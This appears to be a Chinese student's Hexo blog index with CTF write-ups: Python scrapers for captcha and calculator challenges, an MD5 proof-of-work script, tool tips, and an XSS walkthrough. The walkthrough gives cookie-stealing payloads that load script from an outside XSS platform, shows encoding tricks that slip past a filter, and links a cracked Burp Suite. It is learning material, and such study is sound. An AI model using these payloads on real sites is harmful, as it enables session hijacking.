鉴于我的Python学的跟shi一样（正在重学）所以以下内容仅供参考，比我方法好的比比皆是。 将解码的文件转换为BeautifulSoup对象 1soup = BeautifulSoup(enc, &quot;xml&quot;) 查找所有text标签并返回tag对象，将tag对象的x轴的值转换为int类，并且连同text里面的字符逐个付给一个空的list列表。 1234List = []for tag in soup.find_all(&apos;text&apos;): List.append([int(tag[&apos;x&apos;]), tag.string]) tag是soup.find()返回的对象类型，具体关于BeautifuSsoup的使用可以参考官文https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/ 接下来只需要使用list的排序功能就可以了，由于我把x的值作为了第一个属性所以无需指定排序关键字，放到第二个的话需要手动指定，步骤很简单自行搜索即可。 1List.sort() 可以输出看一下字符的顺序按照离x轴的距离拍好了。最后取出里面的字符组合起来就可以了。 1234getString = &quot;&quot;for c in List: getString += c[1] 剩下的就是提交了这里就不重复了。最后结果OK，最后完整代码 123456789101112131415161718192021222324252627282930313233import requestsfrom bs4 import BeautifulSoupimport base64url = &quot;http://example.com/&quot;response = requests.get(url)Cookies = response.cookiessoup = BeautifulSoup(response.text, &quot;html.parser&quot;)src = soup.find(&quot;img&quot;).get(&quot;src&quot;).split(&apos;,&apos;)[1]enc = base64.b64decode(src)soup = BeautifulSoup(enc, &quot;xml&quot;)List = []for tag in soup.find_all(&apos;text&apos;): List.append([int(tag[&apos;x&apos;]), tag.string])List.sort()getString = &quot;&quot;for c in List: getString += c[1]response = requests.get(url + &quot;?code=&quot; + getString, cookies = Cookies)print(response.text) 最最后附上Python的其他编码解码方式。转载：https://blog.csdn.net/five3/article/details/83626446]]></content>
  </entry>
  <entry>
    <title><![CDATA[XSS 随笔 02]]></title>
    <url>%2F2019%2F04%2F08%2FXSS%E9%9A%8F%E7%AC%9402%2F</url>
    <content type="text"><![CDATA[昨晚肝到两点总算是突破了防线，然而却因为漏了一个分号最后也没搞出来。今早上改好了，成功又解出来一道。干脆一鼓作气做完最后一道XSS再一起发步骤吧。]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS 题目解析（上篇）]]></title>
    <url>%2F2019%2F04%2F08%2FXSS-%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90-%EF%BC%88%E4%B8%8A%E7%AF%87%EF%BC%89%2F</url>
    <content type="text"><![CDATA[在开始解题之前先说一下什么是Proof Of Work，一会会用到。Proof Of Work 简称POW中文叫做工作量证明，简单来说就是用户需要通过计算机完成一定量的计算工作，才能获得需要的信息。可以用来防御拒绝服务攻击也可以用于电子货币。图片上简单说就是你得用计算机算出来这个验证码。图片的要求上说的很清楚了你的验证码前0-6位必须经过MD5加密后能够匹配示例字符串。那么接下来只需要写个脚本跑一下就可以了，官方提供了POW的工具但是我的环境没有调试成功等我试验成功了在发出来过程，这里先用自己的Python代码。 12345678910from itertools import countimport hashlibdef md5(s): return hashlib.md5(s.encode()).hexdigest()for i in count(100000): if md5(str(i)).startswith(&apos;49ab02&apos;): print(i) break 使用 haslib 进行MD5加密运算，创建一个 itertools 迭代器 利用cout() 方法从100000开始依次叠加 并将生成数字编码，直到找到前6位能够匹配示例字符的数字。 知道了怎么获取这个验证码现在开始解题。 第一题：Baby XSS 根据题目描述，我们需要以admin的身份访问admin.php才能获取里面的flag。先点开admin.php看一下果然不行，提示你不是admin。那么既然如此我们就需要获取admin的身份。由此想到获取admin的cookies然后通过Burp Suite工具修改登录时的cookies就可以了。 现在问题变成了获取cookies。题目给出了给admin发送message的文本框，自然就想到用XSS获取cookies。 先试探一下目标有没有设置过滤机制。 1&lt;script&gt;alert(1)&lt;/script&gt; 发送成功，我们可以点Click me to view 看一下运行情况。看来代码被原样执行了，没有做过滤处理。 这样获取cookies就很简单了，植入一个自己的Payload就可以了。我使用了一个免费的XSS平台。http://xss.tf创建一个项目使用默认模块就可以。配置完成后，在使用界面可以看到使用说明，提供了很多使用方式。 我们选择直接插入script标签的方式。 1&lt;sCrIpt srC=http://xss.tf/GCu&gt;&lt;/sCRipT&gt; 这里的不规则大小写是为了防止过滤掉script标签，本题经测试可以无视。将代码输入message消息框并提交。成功钓到了admin，展开后可以看到cookies。接下来就很简单了使用Burp Suite修改cookies就可以了。我给出一个永久破解版的Burp Suite但是这个版本不是很新，最高只能使用Java 8不过不用注册机破解，已经开启了scanner功能。打开前需要先把时间设置到2017年以前，开启后在恢复时间即可。链接：https://pan.baidu.com/s/1TLFXq04xmkL4L-cDtYEo7Q 提取码：qun1 先在Proxy中的option里面添加一个代理地址和端口。然后把你的浏览器代理服务设置成这个地址端口即可。代理服务设置详见https://kkkiona.github.io/2019/04/06/VPS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BASSR_SS/ 开启intercept后，再点一下admin.php。把cookies改成刚才获取到的cookies再点forward。flag到手。 第二题：XSS 1 题目说xss.php比较脆弱，请通过URL给admin发送请求捕获admin的cookies，里面包含了flag。 先点开xss.php看一下。从给出的php代码中可以看出来对提交信息里面的” 、&lt;、&gt; 三个符号进行了过滤。先随便提交点东西试试。从提交情况来看，我们的代码放到了script标签里面并被定义成一个字符串变量。很容易想到用”符号构造闭合语句。 1&quot;;alert(1);// 如果这段代码可以成插入，那么script标签将会变成 1var a=&quot;&quot;;alert(1);//&apos;; 实验果然由于”被屏蔽无法构成闭合，而且被锁死的不只是”还有&lt;、&gt;没有这些字符将很难构造我们需要的代码。 看来直接写入明文是不可能的了，由此我们想到使用“暗文”来绕过php的检测。我们可以通过转码的方式来绕过检测。 可以通过使用Unicode编码来绕过php的检测，浏览器会自动解析Unicode编码把他转换为相应的字符。此方法需要明确提交的信息执行顺序是先经过php对提交内容进行原封不动的检测，再交给浏览器解析。 使用编码工具对上面的语句进行转码。把编码后的内容提交一下看看。OK，成功执行。那么接下来只需要植入Payload。对照你的XSS平台的使用说明，发现没有合适的使用方式，因为我们提交的内容在script标签里面，如果直接把我们的Payload写到script里面也不是不行但是过于庞大。也想到可不可以闭合script标签自己再重新构造标签，这个方法也是行不通的，我认为是因为在你的代码被解析之前，原本的script标签已经存在了所以不能闭合，而是会被解释成错误代码。可以看到灰色的script标签并没有被解析。所以我们可以使用createElement()方法来把script写到body里面。12345&quot;;var s=document.createElement(&apos;script&apos;);document.body.appendChild(s);s.src=&quot;http://xss.tf/Vw6&quot;;// 写入之后发现OK，执行，并且你的XSS平台也收到了提示。但是这里的信息是你本地的信息，因为提交者是你自己抓的包当然也是你的，我们需要通过URL的方式让admin来执行这个脚本。 回到题目页面把你编码后的代码放到示例URL后面提交后发现代码没了，经分析发现原来是Unicode的&amp;#阻断了传输，因为URL传输是有自己的编码的，那么我们就把代码转换成URL编码就可以了。注意是把Unicode编码好的再转一次转成encodeURIComponent编码。提交编码。flag在cookies里面。]]></content>
  </entry>
  <entry>
    <title><![CDATA[Python 简单的网页抓取和提交表单]]></title>
    <url>%2F2019%2F04%2F07%2FPython-%E7%AE%80%E5%8D%95%E7%9A%84%E7%BD%91%E9%A1%B5%E6%8A%93%E5%8F%96%E5%92%8C%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95%2F</url>
    <content type="text"><![CDATA[环境说明：Python 3外部依赖：requests、bs4、BeautifulSoup先看题目 题目很简单，就是限时计算给出的算式并提交。方法一、计算器一台。方法很简单只需要在1.5s内计算出结果再提交就行了，大约几千左右的APM就够了。方法二、使用网络爬虫。爬虫的话自然使用Python是最方便不过的，大体思路就是抓取公式-&gt;计算-&gt;提交。既然是做题那么首先第一步肯定是化简，做题最讨厌的不是不会做而是把1+1做成∞+∞。我们先多刷新几次页面看一下。可以很明显看到公式采用的是x1+x2*x3-x4的固定格式。那这就简单多了，不需要判断运算符也不用修改运算顺序，直接省去了一个heap的工作量。再来看一下代码。可以看到表单使用Get传值，传递对象是自己。GET使用URL传递参数，来测试一下URL。提交前：提交后：可以看到answer的值被脚本通过URL捕获并显示相关内容。现在的工作具体为抓取抓取公式-&gt;计算-&gt;生成URL-&gt;提交先来完成前两步工作：新建一个py文件，引入抓包用的requests和分析HTML结构的bs4. 12import requestsfrom bs4 import BeautifulSoup 向指定页面发送GET请求并获取响应 1response = requests.get(&quot;http://example.com/&quot;) 得到的response响应可以以content（二进制流）、text（文本）等多种格式输出，作为文本的时候还可以指定编码格式。现以text格式输出一下看看结果。 1print(response.text) 毫无疑问我们成功抓到了页面内容。下面需要获取公式。 12345678soup = BeautifulSoup(response.text, &quot;html.parser&quot;)getString = soup.find(id=&quot;exp&quot;).stringSum = int(getString.split()[2])Sum *= int(getString.split()[4])Sum += int(getString.split()[0])Sum -= int(getString.split()[6]) 先把获取的文本转成BeautifulSoup对象，通过字符串截取和强制转换变成单个数字并计算。由于已经确定运算符和运算规则这里就容易很多。然后把答案插入到URL并发送GET请求 1response = requests.get(&quot;http://example.com/calculator/?answer=&quot; + &apos;%d&apos; % Sum) 然后你会发现提示问题页面还未建立，没有问题何来答案。简述一下HTTP请求的规则：HTTP请求的三次握手客户端向服务端发送syn=1，seq=client请求的ID;服务端向客户端发送syn=1,seq=服务端请求的ID,ack=客户端请求的ID+1;客户端向服务端发送syn=0,seq=客户端请求的ID+1,ack=服务端请求的ID+1,data\data…所以简单来说就是HTTP向服务器发送请求时会有一个专属ID来让服务器和客户端保持连接，这个ID存在于cookies里面。如果不连同cookies发送给服务器，那么服务器就会认为是两个不同的客户发送的请求从而出现上面的错误。所以我们要做的是连同cookies一起发送。先从response里面获取cookies并保存。 1Cookies = response.cookies 修改二次请求 1response = requests.get(&quot;http://example.com/?answer=&quot; + &apos;%d&apos; % Sum, cookies=Cookies) 再来看一下结果成功！总结：这道题比较基础，简单的使用了Python的爬虫功能，主要是学习了HTTP请求的过程，关键在于cookies的传递。 忘记放出完整代码了，补上！ 123456789101112131415161718import requestsfrom bs4 import BeautifulSoupresponse = requests.get(&quot;http://123.207.149.64:23331/calculator/&quot;)Cookies = response.cookiessoup = BeautifulSoup(response.text, &quot;html.parser&quot;)getString = soup.find(id=&quot;exp&quot;).stringSum = int(getString.split()[2])Sum *= int(getString.split()[4])Sum += int(getString.split()[0])Sum -= int(getString.split()[6])response = requests.get(&quot;http://123.207.149.64:23331/calculator/?answer=&quot; + &apos;%d&apos; % Sum, cookies=Cookies)print(response.text) 后面打算写一篇关于POST传递的使用方式和详细的HTTP请求的相关知识]]></content>
  </entry>
  <entry>
    <title><![CDATA[关于Python的使用]]></title>
    <url>%2F2019%2F04%2F07%2F%E5%85%B3%E4%BA%8EPython%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[今天遇到了一道网络爬虫的题目，于是便重新拾起了N年前自己学习的Python 2，下面就说一下Python的相关问题。首先关于Python版本的问题，虽然Python 2 ，Python 3 都在更新，而且据统计显示有70%以上的作者仍在使用Python 2，但是真的非常强烈推荐Python 3。Python 3 不仅仅是对语法做了优化，而且对许多库做了改进、合并。比如Python 2 的urllib和urllib2 在Python 3 中合并为了urllib（其实都不如request）。总之Python 3 是非常值得使用的。下面是一些安装问题，你可以去官网下载Python 3并安装，https://www.python.org/ Python 3 的Windows安装包是可以勾选path环境变量的无需手动设置。但相比这样我更推荐使用 anaconda 集成包，里面包含了许多科学包及其依赖，同样是一键安装并且可以自动配置环境变量，https://www.anaconda.com/ 提供了 Python 2，Python 3 两个版本。关于编辑器，新手可以使用Thonny，十分小巧简洁的Python 编辑器，没有复杂的工程模块，打开软件写就完了，并且自带了Python环境无需提前安装Python即可使用，也可以自己配置解释器。缺点是功能相对较弱。https://thonny.org/比较常见的是pyCharm，操作模式类似于eclipse，功能强大代，码高亮，自动填写做的很好。项目管理很方便，可以跨平台。可以很方便的管理库文件，添加外部依赖等等。提供了免费及收费两个版本。没什么大缺点，就是对外部包引入的搜索方式有时候会让人头大。明明项目里都显示有package了就是import不进来。https://www.jetbrains.com/pycharm/download/#section=windows另外推荐一个交互式笔记本，Jupyter notebook（又称IPython notebook）支持运行超过40种编程语言。安装教程十分简单。跨平台，实时代码编辑。缺点，关键词高亮很差，语法检测很弱，有时候错误语法照样可以运行。https://jupyter.org/对于热衷文本编辑器的人员可以使用sublime，另外C、Java程序员可以使用vs和eclipse。Linux推荐vim。关于同时使用Python 2 和 Python 3，如果确实需要两个环境的话。可以参考这篇文章https://www.cnblogs.com/zhengyihan1216/p/6011640.html简述一下就是安装第一个Python的时候记得把Python.exe改个别名，并且使用pip的时候要对应Python版本，最后分别添加path就可以了。下一篇介绍如何简单的使用 requests package抓取页面和表单提交。]]></content>
  </entry>
  <entry>
    <title><![CDATA[XSS 随笔]]></title>
    <url>%2F2019%2F04%2F07%2FXSS%20%E9%9A%8F%E7%AC%9401%2F</url>
    <content type="text"><![CDATA[第一次遇到XSS的题目，由于做错了题目顺序，直接从第二道题做的，所以搞了一天多也没成功。多亏学长提示从第一题入门开始做，结果由于这两天的学习很快就完成了第一道题。使用的是XSS Hunter的payload抓的cookies。笔记还没整理，打算在努力一下把第二道题攻克以后一起发详细步骤，大体内容就是XSS的攻击方式，以及关于proof of work的一点知识吧。再次感谢学长！]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[First Article]]></title>
    <url>%2F2019%2F04%2F03%2Ffirst%20blog%2F</url>
    <content type="text"><![CDATA[早上看了一下之前的Github实在是不忍直视还是重新制作一个吧。使用的是hexo搭建的博客，步骤比较简单。但是在themes选择上真的是强迫症患者的噩梦。偏偏就喜欢上了一个已经停止维护的yilia主题，尝试了无数次修改buffer大小之后依然无法使用HTTP下载，还是ssh吧。下载下来之后更是bug一大堆，比如tag。修改了半天总算是基本正常了。 既然是新做的博客必须好好搞一下，从网易云拉了音乐，另外搞了一下午的图灵机器人，而且失败了。。其实hexo 是自带Live2D功能的，但是想做一个高大上的带交友功能的机器人。然而node.js不熟悉挂接图灵接口的时候就是不行，最后无奈先用自带的吧。明天开始研究信息安全。有时间再搞图灵。。]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F04%2F03%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
